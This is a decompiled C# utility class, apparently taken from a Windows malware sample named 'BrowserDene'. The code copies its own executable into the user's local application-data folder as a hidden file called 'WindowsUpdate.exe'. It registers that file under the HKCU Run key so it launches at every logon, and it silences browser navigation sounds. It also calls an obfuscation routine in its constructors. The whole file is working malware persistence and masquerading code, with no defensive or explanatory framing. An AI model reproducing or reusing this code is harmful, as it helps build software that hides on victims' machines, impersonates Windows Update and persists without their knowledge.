using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace BrowserDene;

internal class Utils
{
	private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;

	private const int SET_FEATURE_ON_PROCESS = 2;

	public static string Regkeyname;

	public static string DstName;

	[DllImport("urlmon.dll")]
	[return: MarshalAs(UnmanagedType.Error)]
	private static extern int CoInternetSetFeatureEnabled(int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable);

	public static void DisableClickSounds()
	{
		CoInternetSetFeatureEnabled(21, 2, fEnable: true);
	}

	public static void Copy(string src, string dst)
	{
		if (File.Exists(dst))
		{
			File.SetAttributes(dst, FileAttributes.Normal);
		}
		try
		{
			File.Copy(src, dst, overwrite: true);
		}
		catch (Exception)
		{
		}
		File.SetAttributes(dst, FileAttributes.Hidden);
	}

	public static void Startup(string name, object path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(name, path);
			registryKey.Close();
		}
	}

	public static void DstCheck()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!(Path.GetDirectoryName(location) == folderPath))
		{
			Copy(location, folderPath + "\\" + DstName);
		}
	}

	public Utils()
	{
		Class2.fPYcDOPz3is7I();
		base._002Ector();
	}

	static Utils()
	{
		Class2.fPYcDOPz3is7I();
		Regkeyname = "WindowsUpdate";
		DstName = "WindowsUpdate.exe";
	}
}
